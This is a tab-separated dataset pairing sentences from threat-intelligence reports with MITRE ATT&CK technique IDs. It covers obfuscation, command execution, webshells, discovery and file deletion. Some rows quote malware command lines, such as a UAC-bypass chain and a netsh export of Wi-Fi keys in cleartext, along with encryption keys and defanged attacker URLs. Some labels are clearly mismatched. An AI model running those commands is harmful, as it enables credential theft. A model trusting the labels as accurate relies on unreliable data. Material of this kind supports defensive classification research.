zips up files before exfiltrating them.	['T1560']
’s installer is obfuscated with a custom crypter to obfuscate the installer.	['T1027']
’s Java payload is encrypted with AES.	['T1027']
’s LSADUMP::DCShadow module can be used to make AD updates by temporarily setting a computer to be a DC.	['T1207']
’s LSADUMP::DCSync, KERBEROS::Golden, and KERBEROS::PTT modules implement the three steps required to extract the krbtgt account hash and create/use Kerberos tickets.	['T1550.003']
From these reports, we know that the group uses an abundance of tools and tactics, ranging across zero-day exploits targeting common applications such as Java or Microsoft Office, heavy use of spear-phishing attacks, compromising legitimate websites to stage watering-hole attacks, and targeting over a variety of operating systems – Windows, OSX, Linux, even mobile iOS	['T1189']
We believe this access was abused, for example, by inserting malicious scripts in the country’s official websites in order to conduct watering hole attacks	['T1189']
This targeting of third party organizations to attack further targets is a risky move on the attackers’ part, as it potentially reveals their activity within the compromised third party organizations to the new target (those receiving the malicious documents  Making sense of MuddyWater When we looked at the cluster of activity which consisted of what appeared to be espionage-focused attacks in the Middle East, we were somewhat confused as the previous public reporting had attributed these attacks to FIN7	['T1189']
Online news outlets and general websites were breached and weaponized as a vehicle for watering hole attacks	['T1189']
The payload delivered in these November 2017 attacks using DDE enabled documents was SofacyCarberp, which differs from the Zebrocy downloader delivered in the February 2018 attacks	['T1189']
Like many threat groups, TG-3390 conducts strategic web compromises (SWCs), also known as watering hole attacks, on websites associated with the target organization's vertical or demographic to increase the likelihood of finding victims with relevant information	['T1189']
Threat actors compromise a website used by their target demographic (e.g., compromising a website specializing in oil and gas industry news when targeting the energy vertical)	['T1189']
The malware’s capabilities include taking a system survey, access to the filesystem, executing commands and a reverse shell	['T1059']
This indicates that a human operative was executing commands on a command line style interface, rather than an automated or GUI process	['T1059']
Although MURKYTOP is primarily a command-line reconnaissance tool, it can also be used for lateral movement	['T1059']
After decryption, these 34 commands are plain text with parameters that are space delimited much like a command line	['T1059']
The command and parameter names are hashed before being compared by the binary, making it difficult to recover the original names of commands and parameters	['T1059']
These commands are also executed when the loadconfig command is issued	['T1059']
The loadconfig and state commands are executed during initialization, effectively creating the configuration file if it does not exist and writing the state command to it	['T1059']
Glimpse’s Agent Control Panel showing the interface actors would use to send commands The actor clicks the command to view the results in a popup window named “Result Viewer”	['T1059']
This script relays commands and output between the controller and the system	['T1059']
RemoteCMD: This tool executes commands on remote computers, similar to the PsExec tool	['T1059']
These are in-line with the targeting of the victims witnessed by the attackers using Conmie	['T1059']
Intrusions and campaigns conducted by this group are in-line with PRC goals and self-interest in Taiwan	['T1059']
Figure 3: ALFA TEaM Shell v2-Fake Mail (Default) Figure 4 shows an example email containing the default values the shell	['T1059']
Remexi is a basic back door Trojan that allows attackers to open a remote shell on the computer and execute commands	['T1059']
Though this is unsophisticated, a remote shell does provide a highly flexible and powerful means of remote access in the hands of a skilled attacker	['T1059']
!CMD  Trojan executes a command prompt command	['T1059']
The Trojan will save the output of the command to %TEMP%\win<random number>.txt and send the contents to the C2 server or “The length of Cmd result file is ziro!” if the command was unsuccessful	['T1059']
The Visual Basic macro uses the following command line:  cmd /c expand %TEMP%\setup.cab -F:* %TEMP% && cd /d %TEMP% && del /f /q setup.cab && uacme.exe  The control server credential information contained in the CAB files is different:   Decoded credential data contained in another ipnet.ini	['T1059']
Remote Shell:  The function above is seen throughout many of the binaries in the Mirage family and is executed when a command is sent from the C&C	['T1059']
It is responsible for executing commands in cmd.exe (later down in the functions, not seen in the screenshot, it looks for cmd.exe and executes it using CreateProcessA)	['T1059']
This ID is sent to the CnC with each request for commands to execute	['T1059']
Supported commands “upload“, “screenshot“, “Excel“, “Outlook“, “risk“, “reboot“, “shutdown“, “clean“	['T1059']
Both create one thread, and each thread is responsible for either downloading and executing the file or running a command line program in the terminal:   Figure 28. Commands used for downloading and executing, and running a command in terminal   Figure 29. Commands used in uploading and downloading file Figure 30	['T1059']
cmd.exe /C choice /C Y /N /D Y /T 2 & Del After sleeping, the Trojan will create a GUID and write it to %APPDATA%\Windows\GDI.bin	['T1059']
Otherwise, the Trojan will attempt to parse the response for a command, specifically by splitting the decode response on <> and treating the text to the left of the <> string as the command the text to the right as the command arguments	['T1059']
The malware basically provides a remote CMD/PowerShell terminal for the attackers, enabling them to execute scripts/commands and receive the results via HTTP requests	['T1059']
Execute noninteractive commands on multiple hosts at once	['T1059']
Open interactive python shells with auto-completion on the all-in-memory remote python interpreter	['T1059']
Remote shells on Unix & Windows clients have a real tty with all keyboard signals working just like an SSH shell	['T1059']
Figure 1: SpeakUp’s Victim Distribution  Figure 2: SpeakUp’s propagation rate per day Infection Vector The initial infection vector is targeting the recently reported vulnerability in ThinkPHP and uses command injection techniques for uploading a PHP shell that serves and executes a Perl backdoor	['T1059']
Figure 6: SpeakUp receives additional commands to execute, this time in plain text	['T1059']
Command execution Command execution can create havoc for victim if the malware developer decides to execute commands in the victim’s device	['T1059']
MURKYTOP: a command-line reconnaissance tool	['T1059']
The summit is the latest in a line of signs of diplomatic outreach from North Korea, following the Panmunjom Declaration for Peace, Prosperity and Unification of the Korean Peninsula between South Korea and North Korea on April 27, 2018	['T1059']
The starred commands are undocumented commands	['T1059']
Its presence on a compromised system allows a threat actor to execute a wide variety of commands, including uploading and downloading files, and spawning a reverse shell	['T1059']
UserInstall.exe will abuse the BITSadmin command-line tool to create a job and launch sidebar.exe	['T1059']
This parameter transmits the agent_id to the C2 server to obtain commands the actor wishes to execute on the compromised system	['T1059']
Figure 2: Sofacy Fysbis capability related leakage through strings Figure 2 shows interactive status / feedback strings that can give a defender an initial profile of capabilities	['T1027']
For comparison, if we were to inspect Fysbis “RemoteShell” associated strings in one of the stripped variants, we would only see the following:  Figure 3: Sofacy Fysbis stripped binary string references to RemoteShell capability Compare this with what is available from the non-stripped variant:  Figure 4: Sofacy Fysbis non-stripped binary strings referenes to RemoteShell capability Little static analysis gifts like these can help to speed defender enumeration of capabilities and – more importantly – further contribute to correlation and detection across related samples	['T1027']
That malicious dll then loads encrypted shellcode from the binary, which is decrypted and runs the final BUGJUICE payload	['T1027']
Messages are encrypted using AES with a static key	['T1027']
Evidence also supports the hypothesis that there is a encryption plugin for victim files (see below)	['T1027']
Destructive dstr command in BE2 config file Also, on some machines, documents were encrypted, but no related plugin could be found	['T1027']
It is prepended to the encrypted and encoded message	['T1027']
The headers are XOR encrypted with <hdrXORKey1> and <hdrXORKey2> combined and reversed	['T1027']
Build Tool Most of CARBANAK’s strings are encrypted in order to make analysis more difficult	['T1027']
Tool Type Internal Name Industry Name   Backdoor Poison Frog BONDUPDATER   Backdoor Glimpse Updated BONDUPDATER   Webshell HyperShell TwoFace loader   Webshell HighShell TwoFace payload   Webshell Minion TwoFace payload variant   DNS Hijacking Toolkit webmask Related to DNSpionage     Table 1	['T1027']
The HyperShell and HighShell webshells are variants of what we track as TwoFace, with HyperShell being related to the TwoFace loader and HighShell being related to the TwoFace payload, as we reported in July 2017	['T1027']
Encryption consists of XOR with a hardcoded key for its configuration and RC4 with a predefined password for encrypting the victim’s data	['T1027']
Configuration Config.ini is the file where the malware stores its encrypted configuration data	['T1027']
While performing the analysis on the delivery documents using the .sct file AppLocker bypass, we noticed the C# payload was functionally similar to the original RogueRobin payload	['T1027']
Figure 3 Targeted lure content In one of the documents, the victim is presented with what appears to be an obfuscated document with the NATO EOD seal and text alluding to the targeted nation state	['T1027']
WindowsDefender.ini – The Base64 encoded and obfuscated PowerShell script	['T1027']
Figure 3: The first step of decryption will perform XOR on one byte using the previous adjacent byte, starting from the last byte and excluding the first byte  Figure 4: The second step uses RC4, using the first 0x20 bytes from the result of the first step as the RC4 key  Figure 5: Encrypted (Top) and decrypted (bottom) configuration file It is also important to note that while the loader component and the configuration file are located in the same directory (%windows%\system32), the encrypted backdoor is located in a different directory (%Program Files%\Common Files\System\ado)	['T1027']
All strings used by the Trojan are encrypted with the XOR algorithm	['T1027']
Next, the buffer is encrypted using the RC4 algorithm with the 50-byte key (also stored in the backdoor’s body)	['T1027']
11 bytes of this buffer are encrypted with the XOR algorithm as follows: i = 0 while ( 1 ) {   crypted_buffer = (_BYTE *)this_->crypted_buffer;   if ( i gt;= this-gt;crypted_buffer_size - 4 ) // this-gt;crypted_buffer_size == 15     break;   ++i;   crypted_buffer[i + 4] ^= crypted_buffer[i & 3];  The generated buffer in encoded using the BASE64 alphabet, where the last two characters are replaced with “-” and “_”	['T1027']
Next, to the beginning of the BASE64 string a random BASE64 string with the length of 5 characters is added	['T1027']
The first 11 bytes of the received buffer are encrypted with the XOR algorithm	['T1027']
Once it is encrypted using the XOR algorithm, the buffer is encoded with BASE64	['T1027']
These redirects were implemented by adding two malicious scripts obfuscated by a tool similar to the Dean Edwards packer	['T1027']
Many of the Fetch samples we analyzed attempted to obfuscate their functionality by encrypting their embedded strings using AES	['T1027']
Although the activity was previously linked by others to the FIN7 threat actor group, our research suggests the activity is in fact espionage related and unlikely to be FIN7 related	['T1027']
Specifically, the following GitHub repositories appear to be controlled by the MuddyWater threat actor(s):  [unknown SHA256]  Downloads payload from: hxxps://raw.githubusercontent[.]com/F0R3X/BrowserFontArabic/master/ArabicBrowserFont.exe   [unknown SHA256]  Downloads payload from: hxxps://raw.githubusercontent[.]com/F0R3X/BrowserFontArabic/master/FontArabic.exe     9b5e36bb7518a9e333c31d09b589102f89e3425571dd434820ab3c437dc4e0d9 (and several others)  Downloads payload from: hxxps://raw.githubusercontent[.]com/ReactDeveloper2017/react/master/src/test/test.js    Interestingly, both profiles were populated with forked repositories to give them an air of legitimacy as shown in figure 2	['T1027']
The domain names differed but the script adheres to the same logic (including the logic function).” The DNSMessenger malware is an obfuscated and customized version of the popular DNS_TXT_PWNAGE.ps1 script available on GitHub and is also referred to by FireEye as POWERSOURCE	['T1027']
Malicious obfuscated VBA code is executed when the macro is first enabled	['T1027']
In our analysis, the macro is obfuscated, character by character, using the decimal ASCII code	['T1027']
There are two forms of encrypted strings: an RSA256-encrypted string, and custom base64-encoded and RSA256-encrypted string	['T1027']
At face value, this current variant of OopsIE has a vast majority of its strings obfuscated, which can be deobfuscated by splitting the strings using the hyphen as a delimiter, treating each split value as an integer, subtracting one from each integer and converting each into a character	['T1027']
This tool was originally intended to aid defenders in simulating obfuscated PowerShell commands to better their defenses	['T1027']
Invoke-Obfuscation calls the variable obfuscation technique used by the actors to obfuscate this script Random Case + {} + Ticks, which changes all variables in the script to have randomly cased characters, to be surrounded in curly braces and to include the tick (`) character, which is ignored in by PowerShell	['T1027']
By applying two specific obfuscation techniques within Invoke-Obfuscation, we were able to create an obfuscated PowerShell script that was very similar to the QUADAGENT payloads delivered in the attacks discussed in this blog	['T1027']
All the strings and settings were encrypted and obfuscated	['T1027']
The configuration and strings are encrypted using 3DES and Base64 encoding	['T1027']
The shellcode is not encrypted but is obfuscated	['T1027']
Decrypting the Configuration As previously mentioned, the real configuration data is stored in the first stage shellcode but it is not stored in cleartext, but encrypted and compressed	['T1027']
The configuration data is encrypted with the same algorithm described previously by JPCert but using a different XOR value	['T1027']
The configuration blob is encoded using a simple single-byte XOR scheme	['T1027']
KopiLuwak In November 2016, Kaspersky Lab observed a new round of weaponized macro documents that dropped a new, heavily obfuscated Javascript payload that we named KopiLuwak (one of the rarest and most expensive types of coffee in the world)	['T1027']
Figure 3: no detections for SpeakUp in Virus Total In an attempt to endure the investigation process by security researchers, the second stage payload was encoded with salted base64	['T1027']
Some strings are obfuscated with XOR x56	['T1027']
These files are stored within an 217kb encrypted cab file in the dropper’s resources under the name “A”	['T1027']
The cab file was encrypted and decrypted using a simple xor cipher with a rotating 16 byte key: \x36\x11\xdd\x08\xac\x4b\x72\xf8\x51\x04\x68\x2e\x3e\x38\x64\x32	['T1027']
This is encrypted by RC4, using the key {0xb5, 0x78, 0x62, 0x52, 0x98, 0x3e, 0x24, 0xd7, 0x3b, 0xc6, 0xee, 0x7c, 0xb9, 0xed, 0x91, 0x62}	['T1027']
We’ve identified two such files: settings.db sdfg3d.db Here’s how such a database file appears:  These are BASE64 encoded and use the same RC4 encryption key as the malware configuration	['T1027']
The CARROTBAT malware family is a somewhat unique dropper and while it supports various types of decoy documents, and employs rudimentary command obfuscation, it should be made clear that it is not sophisticated	['T1027']
HttpBrowser's executable code may be obfuscated through structured exception handling and return-oriented programming	['T1027']
All third-party trademarks referenced by Cofense whether in logo form, name form or product form, or otherwise, remain the property of their respective holders, and use of these trademarks in no way indicates any relationship between Cofense and the holders of the trademarks	['T1027']
Figure 7: The same de-obfuscated code as Figure 2 The only other script content of the blog-page[.]html is an empty script section	['T1027']
PlayList.vbs contains the obfuscated codes, which it executes after decrypting the obfuscations.	['T1027']
Once executed, Vcrodat loads an encrypted payload on to the victim’s computer.	['T1027']
The JavaScript is heavily obfuscated. The first variable—a—is an array of obfuscated values	['T1027']
This shellcode is decrypted in memory through EQENDT32.EXE	['T1027']
The encrypted file contains a config file of 0x78 bytes. The data is decrypted with an 0xD9 XOR operation.	['T1027']
The actors have made some small changes, such as altering the variable names to avoid Yara detection	['T1027']
To operate and evade standard analysis tools, most of the functions are hashed	['T1027']
The encryption/decryption routine (refer to Figure 5) can be summarized as follows:      Figure 5: Encryption/ Decryption Function  Generate an array of integers from 0x00 to 0xff Scrambles the state of the table using the given key Encrypts or decrypts a string using the scrambled table from (b)	['T1573']
Version 2 Rather than using the host ID as the key, this version uses a random XOR key between 32 and 64 bytes in length that is generated for each session	['T1573']
A build tool is likely being used by these attackers that allows the operator to configure details such as C2 addresses, C2 encryption keys, and a campaign code	['T1573']
After applying this decryption algorithm, we are presented with the following data: h=HOSTNAME-PC&f=mission.ini&c=& The response made by the C2 server uses the same RC4 key for encryption	['T1573']
The BONDUPDATER script, which was named based on the hard-coded string “B007”, uses a custom DGA algorithm to generate subdomains for communication with the C2 server	['T1573']
Figure 9: Example Network Communication In the example, the POWRUNER client sends a random GET request to the C2 server and the C2 server sends the random number (99999999990) as a response	['T1573']
The structure of each of these outbound DNS requests is as follows: <system ID>-<job ID>-<offset in data><more data flag>-<random length of base64 encoded data between 30 and 42 characters>.<c2 domain> The payload will look for different responses to these outbound queries depending on the type of DNS request that the payload uses to communicate with the C2	['T1573']
The C2 server will provide the pre-shared key within the response data and will provide the session ID value via the Set-Cookie field within the response, specifically the string after the PHPSESSID parameter of the cookie	['T1573']
<encoded system data>.<same random number between 100000 and 999999 above>.<c2 name>   After obtaining a session ID and pre-shared key, the PowerShell script will continue to communicate with its C2 server to obtain data to treat as a command	['T1573']
Instead, it immediately issues a query to resolve the following domain, which embeds the session ID value to transmit it to the C2:   <encoded session id>.<same random number between 100000 and 999999>.<c2 domain name>   To transmit the data via the DNS tunneling, the C2 server will respond to the above query with an IPv6 address that contains the number of DNS queries the payload must issue to obtain the entirety of the data from subsequent IPv6 answers	['T1573']
The script will send the specified number of DNS queries using the following format, each of which the C2 will respond with an IPv6 address that the script will treat as a string of data:   www.<sequence number>.<same random number between 100000 and 999999>.<c2 domain name>   The payload will treat the data provided by the C2 as a message, which will have the following structure:   hello<char uuid[35]><char type[1]><data>   The message will start with the string hello followed by a 35-character UUID string	['T1573']
Neither this new domain nor the IP it resolves to have been observed in the past, indicating that the sample in Table 3 may be associated with a newer campaign	['T1016']
Table 4: URL parameters Additionally, the command string is hashed using the same RGPH hashing algorithm as before	['T1016']
In one instance, a log file recovered from an open indexed server revealed that an IP address (112.66.188.28) located in Hainan, China had been used to administer the command and control node that was communicating with malware on victim machines	['T1016']
APT40 used MURKYSHELL at a compromised victim organization to port scan IP addresses and conduct network enumeration	['T1016']
In order to decide which domain xparis() holds, a variable pingadori() uses the radador() function to randomize the domain	['T1016']
Instructions within guide.txt explaining how to carry out DNS hijacking attack In one part of guide.txt, an example target appears to be provided, with a corresponding adversary IP (185.162.235[.]106) for the legitimate domain to be redirected to	['T1016']
Note that IP addresses can be reallocated	['T1016']
Backdoor.Pirpi also collects information about the target’s local network, including the domain controller and workstations	['T1016']
Examining historical IP resolutions revealed a common IP between the active nameservers, 107.175.75[.]123	['T1016']
This IP is of particular interest as historical domain resolutions of this IP revealed that it had resolved to the domain hotmai1l[.]com in the past as well, which was a domain we had previously identified as having a high likelihood of association with DarkHydrus infrastructure	['T1016']
This IP also belongs to the same service provider and class B network range as another IP we had associated with DarkHydrus, 107.175.150[.]113 which specifically resolved to a domain name containing a victim organization’s name	['T1016']
After the second DLL is loaded into memory, the first DLL overwrites the IP address for the control server, effectively changing the address the malware will communicate with	['T1016']
FBI has high confidence that HIDDEN COBRA actors are using the IP addresses for further network exploitation.This alert includes technical indicators related to specific North Korean government cyber operations and provides suggested response actions to those indicators, recommended mitigation techniques, and information on reporting incidents to the U.S	['T1016']
DHS and FBI recommend that network administrators review the IP addresses, file hashes, network signatures, and YARA rules provided, and add the IPs to their watchlist to determine whether malicious activity has been observed within their organization.When reviewing network perimeter logs for the IP addresses, organizations may find numerous instances of these IP addresses attempting to connect to their systems	['T1016']
The IP address in the lateral movement techniques was substituted with the local machine IP address to achieve code execution on the system	['T1016']
When we analyzed the email headers, we determined that the email was sent from an SMTP server using an IP associated with the Yonsei University network	['T1016']
text=  from=  ai= ags=  oe= aq= btnG=  oprnd=  ai= utm=  channel=  The page address in the domain of the command and control server is chosen randomly from the list	['T1016']
Analysis of their configurations show that the C2 servers used both fully-qualified domain names and IP addresses	['T1016']
The code will gather some information about the system, specifically the local IP address, MAC address, and the external IP address of the system	['T1016']
Similar to Reaver as posted by Palo Alto, it gets the IP or domain of the C&C server, the port, name of the binary, a sleep timer, and what Palo Alto calls a “campaign identifier.” Technical Details At this moment, we were unable to retrieve the original infection vector and other information regarding what other tools the APT15 group is using to attack their targets	['T1016']
Victim system reconnaissance The code then tries to obtain the victim’s public IP via “https://api.ipify.org/”	['T1016']
If the first resolved domain IP address starts with 24.125.X.X, then it is set to 1	['T1016']
It is unknown what these domains may have been used for but based on the similarity of domain spoofing and sharing an IP, they are likely part of the adversary infrastructure	['T1016']
Inspecting the class C network for 185.162.235.0/24 shows us that another IP on the same network resolves to an OilRig domain, msoffice-cdn[.]com which we identified in August 2017	['T1016']
"The malware then requests a connection to 192.184.60.229 on TCP port 81 using the command ""05 01 00 01 c0 b8 3c e5 00 51"" and verifies that the first two bytes from the server are ""05 00"" (c0 b8 3c e5 is the IP address and 00 51 is the port in network byte order)"	['T1016']
The chinapolicyanalysis.org domain was used as the sender address, as well as the hosting location of the malicious RTF document	['T1016']
The mericcs.org domain was used as the sender address, as well as the hosting location of the malicious RTF document	['T1016']
The structure of the domain mimics the Mercator Institute for China Studies (MERICS), whose actual domain is merics.org	['T1016']
Network Indicators​     Hostname IP Address Notes   mailcenter.support 221.121.138.139 Domain used to for sending spear phishes and user tracking	['T1016']
chinapolicyanalysis.org 185.130.212.168 Domain used for spear phish sender e-mail address and to host malicious documents	['T1016']
fprii.net 185.130.212.254 Domain used for spear phish sender e-mail address and to host malicious documents	['T1016']
mericcs.org 221.121.138.141 Domain used for spear phish sender e-mail address and to host malicious documents	['T1016']
In February 2018, several KHRAT associated domains began resolving to the IP address 89.46.222[.]97	['T1016']
One of these domains, facebook-apps[.]com, was identified in one of the malware samples associated with this IP address	['T1016']
The diagram in Figure 1 shows the samples, domains, IP addresses and e-mail addresses that we identified during our investigation (See Appendix B for more detail on these.) There is a clear split between Cluster A and Cluster B, with no infrastructure overlap between the two	['T1016']
"One of the first steps that several Mosquito installer packages performed after writing and running this local_update js file was to export all local host’s WiFi profiles (settings and passwords) to %APPDATA%\<profile>.xml with a command line call: cmd.exe /c netsh wlan export profile key=clear folder=""%APPDATA%"" They then gather more network information with a call to ipconfig and arp -a"	['T1016']
hxxp://www.sanjosemaristas[.]com/app/index.php?{A01BA0AD-9BB3-4F38-B76B-A00AD11CBAAA}, providing the current network adapter’s service name GUID	['T1016']
In Figure 9, below, red indicates targeted IP addresses, malware, registrant information, and domains associated with the targeted attack campaign while blue indicates criminal attack IP addresses, malware used, registrant information, and domains:  Figure 9	['T1016']
(Source: Dell SecureWorks) As shown in Figure 10, the unpacked JavaScript code reveals an iframe pointing to an IP address that is hosting the exploit	['T1016']
It is a preferred platform within data centers and the cloud for businesses, as well as an ongoing favorite when it comes to a majority of Internet-facing web and application servers	['T1505.003']
Furthermore, this group has routinely identified and exploited vulnerable web servers of targeted organizations to install web shells, such as ANTAK and ASPXSPY, and used stolen legitimate credentials to compromise externally facing Outlook Web Access (OWA) resources	['T1505.003']
Attack Lifecycle  Initial Compromise APT40 has been observed leveraging a variety of techniques for initial compromise, including web server exploitation, phishing campaigns delivering publicly available and custom backdoors, and strategic web compromises	['T1505.003']
Web shells are heavily relied on for nearly all stages of the attack lifecycle	['T1505.003']
Internal web servers are often not configured with the same security controls as public-facing counterparts, making them more vulnerable to exploitation by APT40 and similarly sophisticated groups	['T1505.003']
Maintain Presence APT40 primarily uses backdoors, including web shells, to maintain presence within a victim environment	['T1505.003']
APT40 strongly favors web shells for maintaining presence, especially publicly available tools	['T1505.003']
OwaAuth — This web shell and credential stealer deployed to Microsoft Exchange servers is installed as an ISAPI filter	['T1505.003']
(Source: SecureWorks)  China Chopper web shell — This web-based executable script communicates with a full-featured user interface to allow threat actors to transfer and create files, open a command terminal, and interact with database servers	['T1505.003']
(Source: SecureWorks) In multiple instances, CTU researchers observed artifacts from unsuccessful attempts to create a web shell on web-accessible JBOSS-based service desk software, followed by use of a functional shell to gain access to the environment	['T1505.003']
(Source: SecureWorks) Reentry attempt After BRONZE UNION was evicted from a compromised environment, which involved blocking the group's known infrastructure, CTU researchers observed the group attempting to reconnect to its OWA web shells and a backup web shell it had deployed during the intrusion	['T1505.003']
To report an intrusion and request resources for incident response or technical assistance, you are encouraged to contact DHS NCCIC (NCCICCustomerService@hq.dhs.gov or 888-282-0870), the FBI through a local field office, or the FBI’s Cyber Division (CyWatch@fbi.gov or 855-292-3937).Protect Against SQL Injection and Other Attacks on Web ServicesTo protect against code injections and other attacks, system operators should routinely evaluate known and published vulnerabilities, periodically perform software updates and technology refreshes, and audit external-facing systems for known web application vulnerabilities	['T1505.003']
They should also take the following steps to harden both web applications and the servers hosting them to reduce the risk of network intrusion via this vector.Use and configure available firewalls to block attacks.Take steps to secure Windows systems, such as installing and configuring Microsoft’s Enhanced Mitigation Experience Toolkit (EMET) and Microsoft AppLocker.Monitor and remove any unauthorized code present in any www directories.Disable, discontinue, or disallow the use of Internet Control Message Protocol (ICMP) and Simple Network Management Protocol (SNMP) as much as possible.Remove unnecessary HTTP verbs from web servers	['T1505.003']
Typical web servers and applications only require GET, POST, and HEAD.Where possible, minimize server fingerprinting by configuring web servers to avoid responding with banners identifying the server software and version number.Secure both the operating system and the application.Update and patch production servers regularly.Disable potentially harmful SQL-stored procedure calls.Sanitize and validate input to ensure that it is properly typed and does not contain escaped code.Consider using type-safe stored procedures and prepared statements.Audit transaction logs regularly for suspicious activity.Perform penetration testing on web services.Ensure error messages are generic and do not expose too much information.Permissions, Privileges, and Access ControlsSystem operators should take the following steps to limit permissions, privileges, and access controls.Reduce privileges to only those needed for a user’s duties.Restrict users’ ability (permissions) to install and run unwanted software applications, and apply the principle of “Least Privilege” to all systems and services	['T1505.003']
Additionally, on that same url, http://mdzz2019.noip[.]cn:3654/ is used to distribute more versions of this Gh0stRAT sample, along with a .zip file containing ASPXSpy, a web shell	['T1505.003']
Audit ISAPI filters and search for web shells on Microsoft Exchange servers	['T1505.003']
"(Source: Dell SecureWorks) Passwords, like ""admin-na-google123!@#"" shown in Figure 4, are required to interact with the web shell"	['T1505.003']
TG-3390 has used additional web shells containing similarly formatted passwords	['T1505.003']
However, the OwaAuth web shell password contains the victim organization's name	['T1505.003']
More information about the OwaAuth web shell is available in Appendix C	['T1505.003']
ASPXTool — A modified version of the ASPXSpy web shell (see Figure 6)	['T1505.003']
The OwaAuth web shell is likely created with a builder, given that the PE compile time of the binary does not change between instances and the configuration fields are padded to a specific size	['T1505.003']
The adversaries modify publicly available tools such as ASPXSpy to remove identifying characteristics that network defenders use to identify web shells	['T1505.003']
TG-3390 actors have deployed the OwaAuth web shell to Exchange servers, disguising it as an ISAPI filter	['T1505.003']
They then identify the Exchange server and attempt to install the OwaAuth web shell	['T1505.003']
If the OwaAuth web shell is ineffective because the victim uses two-factor authentication for webmail, the adversaries identify other externally accessible servers and deploy ChinaChopper web shells	['T1505.003']
(Source: Dell SecureWorks) To facilitate lateral movement, the adversaries deploy ASPXTool web shells to internally accessible systems running IIS	['T1505.003']
Mapping of TG-3390's interactions with web shells during an intrusion responded to by CTU researchers	['T1505.003']
OwaAuth web shell PDB string	['T1505.003']
Each web shell instance is configured to contain SP, Key, and Log variables	['T1505.003']
OwaAuth web shell command set	['T1505.003']
The stylecs.aspx webshell provides fairly significant functionality, as its developer wrote this webshell in JScript that ultimately runs any supplied JScript code provided to it within the HTTP request..	['T1505.003']
The MPK Trojan also monitors specifically for windows that are likely to contain login forms for popular web-based email clients, such as titles that contain: “Gmail -” “Yahoo – login” “Sign In -” “Outlook.com -“ MPK will attempt to parse these window titles to identify the associated email address and record these to the log file using the following format: ///////////// Mail Find <email address> /////////// If the Trojan does not find the window titles associated with Gmail, Yahoo or Outlook, it saves the title to the “Save.tmp” file in the following format: +++++++++++++ Window= <window title> +++++++++++++ The major difference between the IRC variant and non-IRC variant of MPK is the C2 protocol used	['T1010']
Offset Description   0x0 Victim GUID (8C8CEED9-4326-448B-919E-249EEC0238A3)   0x25 Victim IP Address (192.168.180.154)   0x45 Command (0x66660001)   0x49 Length of payload (0x2f – 47)   0x4d Field 1 – Windows major version (0x6 – Windows Vista+)   0x51 Field 2 – Windows minor version (0x1 – Windows 7)   0x55 Field 3 – Unknown (0x20)   0x59 Payload (default flag:4/2/2018 1:01:33 AM)    Table 5 – Beacon structure for PLAINTEE	['T1010']
Linux malware detection and prevention is not prevalent at this time, but Palo Alto Networks customers are protected through our next-generation security platform:  IPS signature 14917 deployed to identify and prevent command and control activity The C2 domains and files mentioned in this report are blocked in our Threat Prevention product	['T1070.004']
The organization managed to discover what scripts were hosted on the server before BE/SandWorm gang deleted them, and unfortunately couldn’t restore them after they were deleted	['T1070.004']
For example, at the end of 2016 CTU researchers observed the threat actors using native system functionality to disable logging processes and delete logs within a network	['T1070.004']
After running within the %TEMP% path, Comnie will delete the original file	['T1070.004']
KEYS Deletes the file named by tempPath + “ky” file so as not to upload anything	['T1070.004']
HDS Deletes the file created by the HD command to reverse the effect	['T1070.004']
DEL-TEMP Deletes all files in the “AppData/Local/Temp” path	['T1070.004']
Overwrite a file with all zeros and mark it for deletion on reboot  Wiping files with zeros and marking it for deletion on reboot.   Delete files using the DeleteFile() API Load an arbitrary library into its process space	['T1070.004']
The SHAPESHIFT malware is capable of wiping disks, erasing volumes and deleting files, depending on its configuration	['T1070.004']
Appendix Malware Family Descriptions    Malware Family  Description  Availability    DROPSHOT  Dropper that has been observed dropping and launching the TURNEDUP backdoor, as well as the SHAPESHIFT wiper malware  Non-Public    NANOCORE  Publicly available remote access Trojan (RAT) available for purchase	['T1070.004']
The message sent to the C2 will be “file is deleted.” if successful or “file is not deleted.” if unsuccessful	['T1070.004']
The dropped executable (MD5: 78734CD268E5C9AB4184E1BBE21A6EB9) contains the compressed FELIXROOT dropper component in the Portable Executable (PE) binary overlay section	['T1070.004']
The dropper will delete itself at the end of the process	['T1070.004']
After this file is copied, the original ‘Update.~tmp’ file is deleted	['T1070.004']
boom! Deletes GID.bin, ShwDoc.VBS and ShwDoc.srv files, as well as the scheduled task whose name a GUID stored in the GID.bin file	['T1070.004']
Also, the x command will delete the generated registry key and the Office365DCOMCheck/SystemDiskClean scheduled task	['T1070.004']
This system configuration file (in.sys) will drop a backdoor installer (UserInstall.exe) then delete itself	['T1070.004']
and then deletes the original launcher	['T1070.004']
This version of the campaign made malicious use of unins000.exe, a process that belongs to the Brazilian information security company GAS Tecnologia, to gather personal information undetected	['T1082']
The autonomous system name of the IP shows that the allocation is controlled by Serverius Holding B.V., which is an autonomous system name we have previously seen associated with the OilRig group	['T1082']
This backdoor collects system information, including the operating system version and hostname, and includes functionality to check, upload, and register plugins that can further enhance its capabilities	['T1082']
The data above contains the hostname (‘HOSTNAME-PC’) of the victim machine, as well as an instruction	['T1082']
To obtain a job, the Trojan builds a subdomain that has the following structure and issues a DNS query to the C2 server: c<unique identifier><job identifier padded with ‘0’ to make three digits><sequence number>c The generated subdomain is then subjected to a number-to-character substitution function that is the inverse of the Table 4, which effectively converts all the digits in the subdomain into characters	['T1082']
Once the second DLL is executed, it gathers information about the victim system’s setup, such as operating system version, and driver and processor information	['T1082']
One computer that was infected with both Cadelspy and Remexi was a system that ran a SIM card editing application	['T1082']
Other functionalities provided by this section of the PowerShell Script are as follows:  Retrieves the following data from the system by leveraging Windows Management Instrumentation (WMI) queries and environment variables: IP Address from Network Adapter Configuration OS Name OS Architecture Computer Name Computer Domain Name Username    All of this data is concatenated and formatted as shown in Figure 13:    Figure 13: Concatenated and formatted data retrieved by PowerShell script  Register the victim’s machine to the C2 server by sending the REGISTER command to the server	['T1082']
Freenki is used to gather information about the infected system and to download a subsequent stage payload	['T1082']
The information this malware collected included the following:The computer nameThe usernameThe execution path of the sampleThe BIOS modelA randomly-generated ID to uniquely identify the systemGroup123 utilized this method to ensure their victim was (a) someone they wanted to target further and (b) someone they could infect further based on the information obtained from the reconnaissance phase	['T1082']
After connecting to the IRC server, the MPK bot sends custom ping messages and provides an introduction via a “!Hello” message that contains the current logged in user of the infected host, if the user has administrator privileges, the hostname, the UUID of the system, and operating system version	['T1082']
The malware queries the Windows API to get the computer name, user name, volume serial number, Windows version, processor architecture and two additional values, which are “1.3” and “KdfrJKN”	['T1082']
